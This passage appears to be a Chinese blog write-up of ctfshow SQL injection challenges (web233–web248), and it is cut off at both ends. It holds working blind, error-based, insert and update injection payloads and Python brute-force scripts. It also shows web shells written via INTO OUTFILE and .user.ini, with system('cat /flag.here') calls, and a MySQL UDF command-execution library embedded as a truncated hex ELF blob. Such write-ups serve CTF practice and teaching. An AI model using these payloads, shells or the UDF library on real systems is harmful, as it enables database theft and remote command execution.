        #payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot;
        #payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot;
        payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(flagass233) from flag233333),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot;

        data&#x3D;&#123;
            &#39;username&#39;: payload,
            &#39;password&#39;:&#39;1&#39;&#125;
        try:
            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.35)
            min&#x3D;j
        except:
            max&#x3D;j

        time.sleep(0.3)</code></pre>

<h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询
$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤</code></pre>

<p>虽然嘴上说着没过滤，但是实际上还是过滤了单引号</p>
<p>可以用斜杠注释掉后面的斜杠，让它与username的第一个单引号闭合</p>
<p>这时的语句为</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;username&#39;;&quot;;</code></pre>

<p>因为username可控，我们只要吧最后一个引号注释，那么<code>\&#39; where username = </code>这部分就相当于password的值，</p>
<p>所以当我们输入<code>password=\&amp;username=,username=database();#</code>时</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511175743362.png" alt="image-20220511175743362"></p>
<p>然后就是正常的查询了</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#
#banlist,ctfshow_user,flag23a

password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)#
因为过滤了单引号，所以16进制绕过。
#id,flagass23s3,info

password&#x3D;\&amp;username&#x3D;,username&#x3D;(select flagass23s3 from flag23a)#</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511180002985.png" alt="image-20220511180002985"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511180011342.png" alt="image-20220511180011342"></p>
<h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询
$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;过滤 or &#39; </code></pre>

<p>过滤了or就不能用information了，可以试试从其他表里找表名</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511224228030.png" alt="image-20220511224228030"></p>
<p>用mysql.innodb_table_stats来代替information_schema。table_schema就要改成database_name。语句则是</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())#</code></pre>

<p>看到表名之后就是利用无列名注入了</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/GH-D/p/11962522.html">https://www.cnblogs.com/GH-D/p/11962522.html</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p>
<p>最终payload为</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(&#96;2&#96;) from (select 1,2,3 union select * from flag23a1)a)#</code></pre>

<h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><blockquote>
<p>update</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询
$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;过滤 or &#39; flag</code></pre>

<p>其实没过滤，用上个题的payload就行</p>
<p>如果过滤了也可以用这个</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)-- - &amp;password&#x3D;\</code></pre>

<h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;插入数据
$sql &#x3D; &quot;insert into ctfshow_user(username,pass) value(&#39;&#123;$username&#125;&#39;,&#39;&#123;$password&#125;&#39;);&quot;;</code></pre>

<p>insert就是插入。但其实注入方式和一般的没有区别,只是说自己构造出查询语句，查询的结果返回在那个表当中了</p>
<p>通过第一个注入点将后边’)&#39;闭合即可</p>
<pre class="language-none"><code class="language-none">username&#x3D;helloworld&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#&amp;password&#x3D;1

username&#x3D;helloworld&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;));#&amp;password&#x3D;1

username&#x3D;helloworld&#39;,(select group_concat(flagass23s3) from flag))#&amp;password&#x3D;1
</code></pre>

<h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>insert注入，过滤空格</p>
<p>用括号注释符都能替代</p>
<pre class="language-none"><code class="language-none">username&#x3D;helloworld&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())));#&amp;password&#x3D;1

username&#x3D;helloworld&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)));#&amp;password&#x3D;1

username&#x3D;helloworld&#39;,(select(group_concat(flag))from(flagb)));#&amp;password&#x3D;1
</code></pre>

<h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>过滤了空格和or，因为过滤了or，所以information_schema就用不了了，可以参考web235</p>
<pre class="language-none"><code class="language-none">username&#x3D;1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511225919771.png" alt="image-20220511225919771"></p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;,(select(flag)from(flagbb)));#&amp;password&#x3D;1</code></pre>

<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写。过滤空格 or sys mysql</p>
<p>根据前面都是在flag里，所以flag先确定下来。然后直接写脚本</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">import requests
import itertools
url &#x3D; &quot;http:&#x2F;&#x2F;a31fe426-9043-4aaf-b986-6270c466a4da.challenge.ctf.show&#x2F;api&#x2F;insert.php&quot;
for i in itertools.product(&#39;ab&#39;, repeat &#x3D; 5):
    tables &#x3D; &quot;flag&quot; + &#39;&#39;.join(i)
    payload &#x3D; &#123;
        &#39;username&#39;: f&quot;hellow0rld&#39;,(select(group_concat(flag))from(&#123;tables&#125;)))#&quot;,
        &#39;password&#39;: &#39;1&#39;
    &#125;
    r &#x3D; requests.post(url&#x3D;url, data&#x3D;payload)
</code></pre>

<p>纯爆破</p>
<h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><p>sql语句</p>
<pre class="language-none"><code class="language-none">$sql &#x3D; &quot;delete from ctfshow_user where id &#x3D; &#123;$id&#125;&quot;;</code></pre>

<p>delete函数在进行判断后会回显删除成功、或删除失败,所以就不能给予回显内容来爆破数据、所以这里用时间盲注</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">#@Auth：Sentiment
import requests
url&#x3D;&#39;http:&#x2F;&#x2F;80bc5222-eeb8-4d94-a68a-57d494f5809e.challenge.ctf.show&#x2F;api&#x2F;delete.php&#39;
flag&#x3D;&#39;&#39;
for i in range(1,50):
    m&#x3D;32
    n&#x3D;127
    while 1:
        mid&#x3D;(m+n)&#x2F;&#x2F;2
        data&#x3D;&#123;
        #&#39;id&#39;:&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),1)#&quot;.format(i,mid) # banlist,ctfshow_user,flag
        #&#39;id&#39;:&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),0)&quot;.format(i,mid) #id,flag,info
        &#39;id&#39;:&quot;if(ascii(substr((select flag from flag),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),0)&quot;.format(i,mid) #ctfshow&#123;24de54e5-a424-4e33-b6ff-00da4a72c909&#125;    &#125;
        &#125;
        print(data)
        try:
           r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;1)
           m&#x3D;mid
        except:
            n&#x3D;mid
        if(m+1&#x3D;&#x3D;n):
            flag+&#x3D;chr(m)
            print(flag)
            break
</code></pre>

<h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><p>sql语句</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;&#x2F;备份表
$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;</code></pre>

<pre class="language-txt" data-language="txt"><code class="language-txt">SELECT ... INTO OUTFILE &#39;file_name&#39;
        [CHARACTER SET charset_name]
        [export_options]

export_options:
    [&#123;FIELDS | COLUMNS&#125;
        [TERMINATED BY &#39;string&#39;]&#x2F;&#x2F;分隔符
        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]
        [ESCAPED BY &#39;char&#39;]
    ]
    [LINES
        [STARTING BY &#39;string&#39;]
        [TERMINATED BY &#39;string&#39;]
    ]

----------------------------------------------------
“OPTION”参数为可选参数选项，其可能的取值有：

FIELDS TERMINATED BY &#39;字符串&#39;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

FIELDS ENCLOSED BY &#39;字符&#39;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

FIELDS ESCAPED BY &#39;字符&#39;：设置转义字符，只能为单个字符。默认值为“\”。

LINES STARTING BY &#39;字符串&#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

LINES TERMINATED BY &#39;字符串&#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
</code></pre>

<p>FIELDS TERMINATED BY、 LINES STARTING BY、 LINES TERMINATED BY写马</p>
<pre class="language-none"><code class="language-none">在api&#x2F;dump.php传POST
filename&#x3D;ma.php&#39; LINES STARTING BY &#39;&lt;?php eval($_GET[1]);?&gt;&#39;#

然后访问url&#x2F;dump&#x2F;ma.php

url&#x2F;dump&#x2F;ma.php?1&#x3D;system(&#39;cat &#x2F;flag.here&#39;);</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511230830784.png" alt="image-20220511230830784"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511230845780.png" alt="image-20220511230845780"></p>
<h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><p>sql语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;备份表
$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;过滤了php</code></pre>

<p>可以利用.user.ini</p>
<p>先传</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">filename&#x3D;.user.ini&#39; lines starting by &#39;;&#39; terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#
为保证auto_prepend_file&#x3D;1.jpg在单独一行，所以在开头结尾都加上了0x0a来换行</code></pre>

<p>再传1.jpg就行了</p>
<p>因为过滤了php，可以用短标签或者十六进制绕过：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">filename&#x3D;1.jpg&#39; LINES STARTING BY &#39;&lt;?&#x3D;eval($_GET[1]);?&gt;&#39;#</code></pre>

<p>然后访问</p>
<pre class="language-payload" data-language="payload"><code class="language-payload">&#x2F;dump&#x2F;index.php?1&#x3D;system(&#39;cat &#x2F;flag.here&#39;);</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511231353361.png" alt="image-20220511231353361"></p>
<h2 id="web244、245"><a href="#web244、245" class="headerlink" title="web244、245"></a>web244、245</h2><p>报错注入</p>
<p>updatexml()和extractvalue()应该都可以</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">web244
&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))--+

&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flag&#39;),0x7e))--+

&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,30),0x7e))+--+
&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),20,30),0x7e))+--+

web245同理</code></pre>

<h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><p>sql语句</p>
<pre class="language-none"><code class="language-none">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤
过滤updatexml extractvalue
    </code></pre>

<p>报错注入</p>
<p>过滤updatexml extractvalue了之后，还有这些可用</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1.floor()、round()、ceil()

2.exp() &#x2F;&#x2F;5.5.5版本之后可以使用

3.name_const 

4.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错
</code></pre>

<p>payload</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; Union select 1,count(*),concat((database()),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+</code></pre>

<p>然后就是正常的查列查字段的操作了</p>
<p>还可以用这种</p>
<pre class="language-none"><code class="language-none">1&#39; or 1 group by concat_ws(0x7e,(select flag2 from ctfshow_flags),floor(rand(0)*2)) having min(0) or 1 --+</code></pre>

<h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><p>sql语句</p>
<pre class="language-none"><code class="language-none">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤
过滤updatexml extractvalue floor
    </code></pre>

<p>floor也过滤了</p>
<pre class="language-none"><code class="language-none">round()&#96;和&#96;ceil()&#96;可以代替&#96;floor()</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512175811180.png" alt="image-20220512175811180"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512175845954.png" alt="image-20220512175845954"></p>
<pre class="language-sql" data-language="sql"><code class="language-sql">&#39; union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa ), 0x7e,round(rand(0)*2))b from information_schema.tables group by b --+

-1&#39; Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;ctfshow_web&#39; limit 1,1),0x26,ceil(rand(0)*2))x from information_schema.columns group by x;--</code></pre>

<p>后边正常查就行，要注意的就是别忘了加limit，还有就是字段名flag变成了flag?，表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。所以最终的payload为</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">http:&#x2F;&#x2F;73673ded-1809-4e00-a9cf-eb2535a42fa6.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;-1&#39; Union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),0x26,ceil(rand(0)*2))x from information_schema.columns group by x;--+</code></pre>

<h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><p>sql语句</p>
<pre class="language-none"><code class="language-none">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤,</code></pre>

<p>题目提示是udf注入</p>
<p>原理大致就是mysql可以把dll文件写到目标机子的plugin目录，这个目录是可以通过<code>select @@plugin_dir</code>来得到的。</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">&#x2F;api&#x2F;?id&#x3D;1&#39;; select @@plugin_dir; -- -
查出Mysql插件路径：&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;

&#x2F;api&#x2F;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+
引入udf.so文件从而创建函数sys_eval</code></pre>

<p>大师傅的脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests

base_url&#x3D;&quot;http:&#x2F;&#x2F;994eba84-9ea5-4701-b204-01320382100c.challenge.ctf.show&#x2F;api&#x2F;&quot;
payload &#x3D; []
text &#x3D; [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;]
udf &#x3D; &quot;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF